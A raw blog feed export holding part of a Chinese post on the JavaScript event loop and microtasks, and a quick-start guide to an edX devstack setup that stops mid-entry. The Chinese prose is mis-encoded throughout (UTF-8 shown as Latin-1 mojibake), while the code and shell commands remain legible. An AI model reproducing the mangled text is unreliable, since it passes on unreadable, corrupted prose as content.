c</span></span><br></pre></td></tr></table></figure></p><p>Promiseäº§ç”Ÿçš„æ˜¯Javascriptå¼•æ“å†…éƒ¨çš„å¾®ä»»åŠ¡ï¼Œè€ŒsetTimeoutæ˜¯æµè§ˆå™¨APIï¼Œå®ƒäº§ç”Ÿå®ä»»åŠ¡ã€‚å¾®ä»»åŠ¡å§‹ç»ˆå…ˆäºå®ä»»åŠ¡ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> r = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'a'</span>);</span><br><span class="line">  resolve()</span><br><span class="line">&#125;);</span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'d'</span>), <span class="number">0</span>);</span><br><span class="line">r.then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'c'</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'b'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// a b c d</span></span><br></pre></td></tr></table></figure></p><p>æ‰§è¡Œä¸€ä¸ªè€—æ—¶1sçš„Promiseï¼Œç¡®ä¿äº†ä»»åŠ¡bæ˜¯åœ¨dä¹‹åè¢«æ·»åŠ åˆ°ä»»åŠ¡é˜Ÿåˆ—ã€‚å³ä½¿è€—æ—¶ä¸€ç§’çš„cæ‰§è¡Œå®Œæ¯•ï¼Œæ‰æ‰§è¡Œbï¼Œå®ƒä»¬ä»ç„¶å…ˆäºdæ‰§è¡Œã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'d'</span>), <span class="number">0</span>);</span><br><span class="line"><span class="keyword">var</span> r = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">  resolve();</span><br><span class="line">&#125;)</span><br><span class="line">r.then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> begin = <span class="built_in">Date</span>.now();</span><br><span class="line">  <span class="keyword">while</span>(<span class="built_in">Date</span>.now() - begin &lt; <span class="number">1000</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'c'</span>);</span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">      resolve()</span><br><span class="line">    &#125;).then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'b'</span>))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// c b d</span></span><br></pre></td></tr></table></figure></p><p>ç¬¬ä¸€ä¸ªå®è§‚ä»»åŠ¡ä¸­ï¼Œæ‰§è¡Œäº†a,bã€‚setTimeoutåï¼Œç¬¬äºŒä¸ªå®è§‚ä»»åŠ¡æ‰§è¡Œresolveï¼Œthenä¸­çš„å¼‚æ­¥ä»£ç å¾—åˆ°æ‰§è¡Œï¼Œè¾“å‡ºäº†c<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">duration</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'b'</span>);</span><br><span class="line">    setTimeout(resolve, duration)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'a'</span>);</span><br><span class="line">sleep(<span class="number">500</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="string">'c'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">// a b c</span></span><br></pre></td></tr></table></figure></p><h3 id="7-å¸¸è§é—®é¢˜"><a href="#7-å¸¸è§é—®é¢˜" class="headerlink" title="7. å¸¸è§é—®é¢˜"></a>7. å¸¸è§é—®é¢˜</h3><h4 id="7-1-SetTimeoutè¯¯å·®"><a href="#7-1-SetTimeoutè¯¯å·®" class="headerlink" title="7.1 SetTimeoutè¯¯å·®"></a>7.1 SetTimeoutè¯¯å·®</h4><p>å½“æ‰§è¡Œ setTimeout æ—¶ï¼Œæµè§ˆå™¨å¯åŠ¨æ–°çš„çº¿ç¨‹å»è®¡æ—¶ï¼Œè®¡æ—¶ç»“æŸåè§¦å‘å®šæ—¶å™¨äº‹ä»¶å°†å›è°ƒå­˜å…¥å®ä»»åŠ¡é˜Ÿåˆ—ï¼Œç­‰å¾… JS ä¸»çº¿ç¨‹æ¥å–å‡ºæ‰§è¡Œã€‚å¦‚æœè¿™æ—¶ä¸»çº¿ç¨‹è¿˜åœ¨æ‰§è¡ŒåŒæ­¥ä»»åŠ¡çš„è¿‡ç¨‹ä¸­ï¼Œé‚£ä¹ˆæ­¤æ—¶çš„å®ä»»åŠ¡å°±åªæœ‰å…ˆæŒ‚èµ·ï¼Œè¿™å°±é€ æˆäº†è®¡æ—¶å™¨ä¸å‡†ç¡®çš„é—®é¢˜ã€‚</p><p><br></p><h4 id="7-2-é¡µé¢æ¸²æŸ“æ—¶æœº"><a href="#7-2-é¡µé¢æ¸²æŸ“æ—¶æœº" class="headerlink" title="7.2 é¡µé¢æ¸²æŸ“æ—¶æœº"></a>7.2 é¡µé¢æ¸²æŸ“æ—¶æœº</h4><ol><li>ä»ä»»åŠ¡é˜Ÿåˆ—ä¸­å–å‡ºä¸€ä¸ªå®ä»»åŠ¡å¹¶æ‰§è¡Œã€‚</li><li>æ£€æŸ¥å¾®ä»»åŠ¡é˜Ÿåˆ—ï¼Œæ‰§è¡Œå¹¶æ¸…ç©ºå¾®ä»»åŠ¡é˜Ÿåˆ—ï¼Œå¦‚æœåœ¨å¾®ä»»åŠ¡çš„æ‰§è¡Œä¸­åˆåŠ å…¥äº†æ–°çš„å¾®ä»»åŠ¡ï¼Œä¹Ÿä¼šåœ¨è¿™ä¸€æ­¥ä¸€èµ·æ‰§è¡Œã€‚</li><li>è¿›å…¥æ›´æ–°æ¸²æŸ“é˜¶æ®µï¼Œåˆ¤æ–­æ˜¯å¦éœ€è¦æ¸²æŸ“ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ª rendering opportunity çš„æ¦‚å¿µï¼Œä¹Ÿå°±æ˜¯è¯´ä¸ä¸€å®šæ¯ä¸€è½® event loop éƒ½ä¼šå¯¹åº”ä¸€æ¬¡æµè§ˆ å™¨æ¸²æŸ“ï¼Œè¦æ ¹æ®å±å¹•åˆ·æ–°ç‡ã€é¡µé¢æ€§èƒ½ã€é¡µé¢æ˜¯å¦åœ¨åå°è¿è¡Œæ¥å…±åŒå†³å®šï¼Œé€šå¸¸æ¥è¯´è¿™ä¸ªæ¸²æŸ“é—´éš”æ˜¯å›ºå®šçš„ã€‚ï¼ˆæ‰€ä»¥å¤šä¸ª task å¾ˆå¯èƒ½åœ¨ä¸€æ¬¡æ¸²æŸ“ä¹‹é—´æ‰§è¡Œï¼‰</li></ol><p><em>æ­¤æ—¶ï¼Œå¦‚æœè¦åˆ¤æ–­è¦æ›´æ–°æ¸²æŸ“ï¼š</em></p><ol start="4"><li>å¦‚æœçª—å£çš„å¤§å°å‘ç”Ÿäº†å˜åŒ–ï¼Œæ‰§è¡Œç›‘å¬çš„ resize æ–¹æ³•ã€‚</li><li>å¦‚æœé¡µé¢å‘ç”Ÿäº†æ»šåŠ¨ï¼Œæ‰§è¡Œ scroll æ–¹æ³•ã€‚</li><li>æ‰§è¡Œå¸§åŠ¨ç”»å›è°ƒï¼Œä¹Ÿå°±æ˜¯ requestAnimationFrame çš„å›è°ƒã€‚</li><li>æ‰§è¡Œ IntersectionObserver çš„å›è°ƒã€‚</li><li>å¯¹äºéœ€è¦æ¸²æŸ“çš„æ–‡æ¡£ï¼Œé‡æ–°æ¸²æŸ“ç»˜åˆ¶ç”¨æˆ·ç•Œé¢ã€‚</li><li>åˆ¤æ–­ taské˜Ÿåˆ—å’ŒmicroTaské˜Ÿåˆ—æ˜¯å¦éƒ½ä¸ºç©ºï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œåˆ™è¿›è¡Œ Idle ç©ºé—²å‘¨æœŸçš„ç®—æ³•ï¼Œåˆ¤æ–­æ˜¯å¦è¦æ‰§è¡Œ requestIdleCallback çš„å›è°ƒå‡½æ•°ã€‚</li></ol><p><br></p><h4 id="7-3-Vue-NextTickåŸç†"><a href="#7-3-Vue-NextTickåŸç†" class="headerlink" title="7.3 Vue NextTickåŸç†"></a>7.3 Vue NextTickåŸç†</h4><p>Vue ä¼šä¾æ®å½“å‰ç¯å¢ƒä¾æ¬¡å°è¯•ä½¿ç”¨ Promise.thenã€MutationObserver å’Œ setImmediate æ¥å®ç°å¼‚æ­¥æ‰§è¡Œï¼Œå¦‚æœè¿™äº›éƒ½ä¸æ”¯æŒåˆ™ä½¿ç”¨ setTimeoutã€‚</p><p><br></p><h4 id="7-4-React-Fiberçš„åŸç†"><a href="#7-4-React-Fiberçš„åŸç†" class="headerlink" title="7.4 React Fiberçš„åŸç†"></a>7.4 React Fiberçš„åŸç†</h4><p>React Fiber çš„åè°ƒè¿‡ç¨‹åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼š</p><ul><li><em>æ¸²æŸ“ï¼ˆrenderï¼‰é˜¶æ®µ</em>ï¼šä¹Ÿç§°ä¸ºåè°ƒï¼ˆreconciliationï¼‰é˜¶æ®µï¼Œè¿™ä¸ªé˜¶æ®µä¼šå°†æ›´æ–°ä»»åŠ¡æ‹†åˆ†æˆå¤šä¸ªå°ä»»åŠ¡ï¼Œæ¯ä¸ªå°ä»»åŠ¡å¯¹åº”ä¸€ä¸ª Fiber èŠ‚ç‚¹ã€‚React ä¼šéå† Fiber æ ‘ï¼Œä¸ºæ¯ä¸ª Fiber èŠ‚ç‚¹æ‰§è¡Œå·¥ä½œï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯å¯ä»¥ä¸­æ–­å’Œæ¢å¤çš„ã€‚</li><li><em>æäº¤ï¼ˆcommitï¼‰é˜¶æ®µ</em>ï¼šå½“æ¸²æŸ“é˜¶æ®µå®Œæˆåï¼ŒReact ä¼šå°†æ‰€æœ‰çš„å˜æ›´ä¸€æ¬¡æ€§åº”ç”¨åˆ° DOM ä¸Šï¼Œè¿™ä¸ªé˜¶æ®µæ˜¯ä¸å¯ä¸­æ–­çš„ã€‚</li></ul><p>React Fiber èƒ½å®ç°ä¸­æ–­ä¸»è¦æ˜¯åŸºäºå…¶å°†æ¸²æŸ“ä»»åŠ¡æ‹†åˆ†æˆä¼—å¤šå°ä»»åŠ¡ï¼Œå¹¶ä¸”å€ŸåŠ©è°ƒåº¦å™¨æ¥ç®¡æ§è¿™äº›å°ä»»åŠ¡çš„æ‰§è¡Œã€‚åœ¨æµè§ˆå™¨çš„æ¯ä¸€å¸§é‡Œï¼Œè°ƒåº¦å™¨ä¼šæ£€æŸ¥æ˜¯å¦æœ‰ç©ºé—²æ—¶é—´ï¼Œè‹¥æœ‰å°±æ‰§è¡Œâ€¦</p><p>ç”¨çš„æ˜¯<code>requestIdleCallback</code>ï¼Œæµè§ˆå™¨æä¾›çš„ä¸€ä¸ª APIï¼Œå®ƒå…è®¸ä½ åœ¨æµè§ˆå™¨çš„ç©ºé—²æ—¶é—´æ‰§è¡Œä¸€äº›ä½ä¼˜å…ˆçº§çš„ä»»åŠ¡ã€‚è¿™æ ·å¯ä»¥é¿å…åœ¨æµè§ˆå™¨ç¹å¿™æ—¶æ‰§è¡Œè¿™äº›ä»»åŠ¡è€Œå¯¼è‡´é¡µé¢å¡é¡¿ï¼Œå½±å“ç”¨æˆ·ä½“éªŒã€‚</p><p><br></p><h3 id="8-ç›¸å…³API"><a href="#8-ç›¸å…³API" class="headerlink" title="8. ç›¸å…³API"></a>8. ç›¸å…³API</h3><h4 id="8-1-requestIdleCallback"><a href="#8-1-requestIdleCallback" class="headerlink" title="8.1 requestIdleCallback"></a>8.1 requestIdleCallback</h4><h4 id="8-2-requestAnimationFrame"><a href="#8-2-requestAnimationFrame" class="headerlink" title="8.2 requestAnimationFrame"></a>8.2 requestAnimationFrame</h4><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://zhuanlan.zhihu.com/p/142742003" target="_blank" rel="noopener">æ·±å…¥è§£æ EventLoop å’Œæµè§ˆå™¨æ¸²æŸ“ã€å¸§åŠ¨ç”»ã€ç©ºé—²å›è°ƒçš„å…³ç³»</a></li><li><a href="https://juejin.cn/post/7164224261752619016" target="_blank" rel="noopener">é¢è¯•å¿…é—®ä¹‹ JS äº‹ä»¶å¾ªç¯(Event Loop)ï¼Œçœ‹è¿™ä¸€ç¯‡è¶³å¤Ÿ</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>å¿«é€Ÿå¼€å§‹Edx-Hç‰ˆå¼€å‘</title>
      <link href="/2019/05/09/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8edx/"/>
      <url>/2019/05/09/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8edx/</url>
      <content type="html"><![CDATA[<h3 id="1-å‰æ"><a href="#1-å‰æ" class="headerlink" title="1. å‰æ"></a>1. å‰æ</h3><p>è¦å¿«é€Ÿå…¥é—¨edxï¼Œé¦–å…ˆä½ å¯ä»¥ä½“éªŒä¸€ä¸‹è‹±è”å•†å­¦é™¢ï¼Œ</p><ul><li>é˜¿é‡Œäº‘ç”Ÿäº§æœ  <a href="https://www.elitemba.cn/" target="_blank" rel="noopener">https://www.elitemba.cn/</a></li><li>è…¾è®¯äº‘æµ‹è¯•æœ lms <a href="http://www.eliteu.xyz/" target="_blank" rel="noopener">http://www.eliteu.xyz/</a></li><li>è…¾è®¯äº‘æµ‹è¯•æœ cms <a href="http://studio.eliteu.xyz/" target="_blank" rel="noopener">http://studio.eliteu.xyz/</a></li></ul><p>åŒæ—¶è¿˜å¯ä»¥</p><ul><li>é€šè¿‡edxå®˜æ–¹æ–‡æ¡£è¿›ä¸€æ­¥äº†è§£  <a href="http://docs.edx.org/" target="_blank" rel="noopener">http://docs.edx.org/</a></li><li>å…¶ä»–ç”¨edxæ­å»ºçš„ç½‘ç«™ï¼š<a href="http://www.xuetangx.com/" target="_blank" rel="noopener">http://www.xuetangx.com/</a> , <a href="https://www.edx.org" target="_blank" rel="noopener">https://www.edx.org</a></li></ul><p>äº†è§£edx Hç‰ˆå‰ï¼Œä½ éœ€è¦æŒæ¡ä¸€äº›åŸºæœ¬çŸ¥è¯†</p><ul><li>Docker <a href="https://docs.docker.com/" target="_blank" rel="noopener">https://docs.docker.com/</a> </li><li>git    <a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">https://git-scm.com/book/zh/v2</a></li><li>React  <a href="https://react.docschina.org/" target="_blank" rel="noopener">https://react.docschina.org/</a></li><li>Sass   <a href="https://www.sass.hk/" target="_blank" rel="noopener">https://www.sass.hk/</a></li></ul><p><br></p><h3 id="2-å®‰è£…å¯åŠ¨"><a href="#2-å®‰è£…å¯åŠ¨" class="headerlink" title="2. å®‰è£…å¯åŠ¨"></a>2. å®‰è£…å¯åŠ¨</h3><h4 id="2-1-å®‰è£…é¡¹ç›®"><a href="#2-1-å®‰è£…é¡¹ç›®" class="headerlink" title="2.1 å®‰è£…é¡¹ç›®"></a>2.1 å®‰è£…é¡¹ç›®</h4><p>è¿™é‡Œå‡è®¾ä½ å·²ç»å®Œæˆå®‰è£…ï¼Œå¦‚æœæ²¡æœ‰ï¼Œ<a href="https://github.com/edx/devstack" target="_blank" rel="noopener">å‰å¾€å®‰è£…</a>ã€‚<br>æ‹‰å–å…¬å¸æœ€æ–°ä»£ç ï¼Œä¿®æ”¹é…ç½®æ–‡ä»¶ã€‚æ¯ä¸ªæ–‡ä»¶å¤¹å¯¹åº”ä¸€ä¸ªgitä»“åº“<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â””â”€â”€ devstack  </span><br><span class="line">â””â”€â”€ ecommerce       # å•è¯¾è´­ä¹°        https://github.com/e-ducation/ecommerce</span><br><span class="line">â””â”€â”€ edx-membership  # ä¼šå‘˜è´­ä¹°        https://github.com/e-ducation/edx-membership</span><br><span class="line">â””â”€â”€ edx-platform    </span><br><span class="line">    # lmså­¦ä¹ å¹³å°, cmsåˆ›å»ºè¯¾ç¨‹å¹³å°      https://github.com/e-ducation/edx-platform</span><br><span class="line">â””â”€â”€ eliteu-payments # å¾®ä¿¡æ”¯ä»˜å®æ”¯ä»˜   https://github.com/e-ducation/eliteu-payments</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-1-å¯åŠ¨é¡¹ç›®"><a href="#2-1-å¯åŠ¨é¡¹ç›®" class="headerlink" title="2.1 å¯åŠ¨é¡¹ç›®"></a>2.1 å¯åŠ¨é¡¹ç›®</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd devstack</span><br><span class="line">make dev.up   # å¯åŠ¨é¡¹ç›®</span><br></pre></td></tr></table></figure><p>å¯åŠ¨æœåŠ¡åï¼Œæ¯ä¸ªæœåŠ¡éƒ½å¯ä»¥åœ¨<code>localhost</code>çš„ç‰¹å®šç«¯å£è¢«è®¿é—®(<code>docker ps</code>æŸ¥çœ‹æ‰€æœ‰url)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Service           URL</span><br><span class="line">E-commerce        http://localhost:18130/dashboard/</span><br><span class="line">LMS               http://localhost:18000/</span><br><span class="line">Studio/CMS        http://localhost:18010/</span><br></pre></td></tr></table></figure></p><p>æœ¬åœ°ç¯å¢ƒä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªè¶…çº§ç”¨æˆ·<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Email: edx@example.com</span><br><span class="line">Username: edx</span><br><span class="line">Password: edx</span><br></pre></td></tr></table></figure></p><p>LMSè¿˜æä¾›äº†ä¸åŒèº«ä»½çš„è´¦å·<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Username    Email                   Password</span><br><span class="line">audit      audit@example.com       edx</span><br><span class="line">honor      honor@example.com       edx</span><br><span class="line">staff      staff@example.com       edx</span><br><span class="line">verified  verified@example.com    edx</span><br></pre></td></tr></table></figure></p><p>æœ‰äº†è¿™äº›urlå’Œè´¦å·å¯†ç ï¼Œä½ å¯ä»¥åœ¨æœ¬åœ°æŠŠä¸šåŠ¡æµç¨‹éƒ½èµ°ä¸€éï¼š<br>åˆ›å»ºè¯¾ç¨‹ï¼Œä½¿ç”¨ä¼˜æƒ åˆ¸è´­ä¹°å•è¯¾ï¼Œä¼šå‘˜è´­ä¹°ï¼Œè¯¾ç¨‹å­¦ä¹ â€”â€”ä¹ é¢˜ï¼Œè®¨è®ºï¼Œç»´åŸºï¼Œæ•™å¸ˆé¢æ¿ç­‰</p><p><br></p><h4 id="2-2-å¸¸ç”¨å‘½ä»¤"><a href="#2-2-å¸¸ç”¨å‘½ä»¤" class="headerlink" title="2.2 å¸¸ç”¨å‘½ä»¤"></a>2.2 å¸¸ç”¨å‘½ä»¤</h4><p>ä½¿ç”¨<code>make</code>å‘½ä»¤å¯ä»¥æŸ¥çœ‹æ‰€æœ‰makeå‘½ä»¤ï¼Œä¸‹é¢åˆ—ä¸¾ä¸€äº›å¸¸ç”¨æ“ä½œã€‚<a href="https://github.com/edx/devstack" target="_blank" rel="noopener">æ›´å¤šå‘½ä»¤æŸ¥çœ‹</a></p><ul><li><p><em>ä¿®æ”¹é…ç½®æ–‡ä»¶</em><br>é€šè¿‡<code>make &lt;service&gt;-shell</code>è¿›å…¥å®¹å™¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> è¿›å…¥lmså®¹å™¨</span><br><span class="line">make lms-shell</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> è¿›å…¥lms-shellåï¼Œä½ å¯ä»¥ä¿®æ”¹å„ç§é…ç½®æ–‡ä»¶</span><br><span class="line">/edx/app/edxapp/lms.env.json</span><br><span class="line">/edx/app/edxapp/lms.auth.json</span><br><span class="line">/edx/app/edxapp/cms.env.json</span><br><span class="line">/edx/app/edxapp/cms.auth.json</span><br></pre></td></tr></table></figure></li><li><p><em>æŸ¥çœ‹æ—¥å¿—</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> æŸ¥çœ‹è¿è¡Œä¸­çš„å®¹å™¨çš„æ—¥å¿—</span><br><span class="line">make logs</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> æŸ¥çœ‹ç‰¹å®šçš„å®¹å™¨çš„æ—¥å¿—</span><br><span class="line">make lms-logs</span><br><span class="line">make discovery-logs</span><br></pre></td></tr></table></figure></li><li><p><em>ç¼–è¯‘é™æ€èµ„æº</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> ç¼–è¯‘lmsé™æ€èµ„æº</span><br><span class="line">make lms-static  </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> åªç¼–è¯‘normal-theme(è‹±è”çš„ä¸»é¢˜åŒ…)</span><br><span class="line">make lms-shell</span><br><span class="line">paver update_assets --theme-dirs=/edx/app/edxapp/edx-platform/themes --themes=normal-theme</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> è‡ªåŠ¨ç¼–è¯‘sassæ–‡ä»¶</span><br><span class="line">make lms-shell</span><br><span class="line">paver watch_assets --td /edx/app/edxapp/edx-platform/themes --t normal-theme</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> å¦‚æœåœ¨æ‰§è¡Œpaverå‘½ä»¤æ—¶é‡åˆ°äº†å¼‚å¸¸ï¼ŒåŠ ä¸Š--settings=devstack_dockeræŸ¥çœ‹æŠ¥é”™ä¿¡æ¯</span><br><span class="line">paver update_assets --settings=devstack_docker</span><br></pre></td></tr></table></figure></li><li><p><em>æ›´æ–°æ•°æ®åº“</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">make lms-shell</span><br><span class="line">paver update_db</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> åªæ›´æ–°lmsçš„æŸä¸ªapp</span><br><span class="line"><span class="meta">#</span> æ›´æ–°/edx-platform/lms/djangoapps/badges, appnameä¸ºbadges</span><br><span class="line">make lms-shell</span><br><span class="line">source /edx/app/edxapp/edxapp_env</span><br><span class="line">cd /edx/app/edxapp/edx-platform</span><br><span class="line">./manage.py &lt;lms/cms&gt; makemigrations &lt;appname&gt; --settings=devstack_docker</span><br><span class="line">./manage.py &lt;lms/cms&gt; migrate &lt;appname&gt; --settings=devstack_docker</span><br></pre></td></tr></table></figure></li><li><p><em>é‡å¯æœåŠ¡</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> serviceå¯å–å€¼: discovery, ecommerce, lms, studio</span><br><span class="line">docker-compose restart &lt;service&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> æˆ–è€…ç›´æ¥ä½¿ç”¨makeå‘½ä»¤</span><br><span class="line">make lms-restart</span><br></pre></td></tr></table></figure></li><li><p><em>åœæ­¢æ‰€æœ‰æœåŠ¡</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make stop</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-ä»£ç ä¿®æ”¹"><a href="#3-ä»£ç ä¿®æ”¹" class="headerlink" title="3. ä»£ç ä¿®æ”¹"></a>3. ä»£ç ä¿®æ”¹</h3><p>å‰ç«¯ä»£ç ä¿®æ”¹ä¸»è¦åŒ…æ‹¬</p><ul><li><p>ä¸»é¢˜æ ·å¼<br>æ ¹æ®è®¾è®¡ç¨¿ï¼Œå“åº”å¼å¸ƒå±€ï¼Œä¸€ä¸ªé¡µé¢å…¼å®¹pcï¼Œæ‰‹æœºï¼Œéœ€è€ƒè™‘ä¸­è‹±æ–‡ä¸¤ç§æƒ…å†µã€‚å…¼å®¹åˆ°IE11</p></li><li><p>æµè§ˆå™¨å…¼å®¹<br>jsä¸ç”Ÿæ•ˆï¼Œæ ·å¼å…¼å®¹</p></li><li><p>ç¿»è¯‘ä¿®æ”¹<br>ç¿»è¯‘æœªåŒ…ï¼Œä¿®æ”¹è‹±æ–‡æ–‡æ¡ˆ</p></li><li><p>æ–°å¢é¡µé¢<br>æ•™æˆä»‹ç»é¡µï¼Œmembershipä¼šå‘˜ä»‹ç»é¡µï¼Œä¼šå‘˜è´­ä¹°é¡µ(å¾®ä¿¡æ”¯ä»˜å®)ï¼Œè¯¾ç¨‹ç®€ä»‹htmlç¼–å†™ç­‰</p></li><li><p>ä¿®æ”¹åŠŸèƒ½<br>â‘ ç™»å½•è´¦å·å¯è¾“å…¥é‚®ç®±ï¼Œå˜ä¸ºå¯è¾“å…¥æ‰‹æœº+é‚®ç®±ï¼›<br>â‘¡ç»‘å®šæ‰‹æœº<br>â‘¢ç”Ÿæˆè¯ä¹¦å›¾ç‰‡ï¼›<br>â‘£æ¥å…¥å¾®ä¿¡sdkå®ç°è½¬å‘è¯¾ç¨‹è¯¦æƒ…é¡µæ˜¾ç¤ºé“¾æ¥å¤´åƒï¼Œç­‰ç­‰</p></li><li><p>ååŠ©åç«¯è§£å†³bug</p></li></ul><p><br><br><br></p><h3 id="4-é…ç½®ä¸»é¢˜"><a href="#4-é…ç½®ä¸»é¢˜" class="headerlink" title="4. é…ç½®ä¸»é¢˜"></a>4. é…ç½®ä¸»é¢˜</h3><p>å…ˆé˜…è¯»<a href="https://edx.readthedocs.io/projects/edx-installing-configuring-and-running/en/latest/configuration/changing_appearance/theming/index.html" target="_blank" rel="noopener">å®˜æ–¹æ–‡æ¡£</a>ï¼Œäº†è§£ä¸»é¢˜åŒ…å¦‚ä½•åˆ›å»ºï¼Œä¿®æ”¹ï¼Œé…ç½®ã€‚</p><p><em>ä¸»é¢˜åŒ…å¯ä»¥æ”¾ä»€ä¹ˆæ–‡ä»¶ ï¼Ÿ</em><br>To override the files that constitute the default Open edX theme, you create replacements for one or more of those files, place them in the file paths that are constructed and named in parallel to the default file locations, configure your Open edX instance to use the files in your themeâ€™s directories instead of the default locations, and then compile the theme.<br>(EdX first looks for files in your theme directories, and uses any file that matches the exact file path and file name of a default UI file.)<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 